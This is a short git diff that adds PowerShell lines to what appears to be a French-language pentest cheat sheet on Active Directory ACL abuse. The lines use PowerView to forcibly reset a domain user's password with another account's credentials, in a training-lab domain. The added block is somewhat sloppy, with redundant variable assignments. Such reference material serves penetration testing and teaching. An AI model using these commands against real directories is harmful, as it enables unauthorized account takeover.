@@ -43,6 +43,18 @@ Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -
 Windows
 
 ```powershell
+$NewPass = 'NewPass@Pentest@'
+$TargedUser = 'INLANEFREIGHT.LOCAL\ssmalls'
+$PrivUser = 'INLANEFREIGHT.LOCAL\hporter'
+$PrivPassword = 'Gr8hambino!'
+$SecPassword = ConvertTo-SecureString '' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential($TargedUser, $NewPass)
+$SecPassword = ConvertTo-SecureString 'Gr8hambino!' -AsPlainText -Force 
+$Cred = New-Object System.Management.Automation.PSCredential($PrivUser, $SecPassword)
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+Set-DomainUserPassword -Identity ssmalls -AccountPassword $UserPassword -Credential $Cred
+
 # Utilisation de credentials alternatifs
 $PrivilegedUserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $PrivilegedCreds = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $PrivilegedUserPassword)
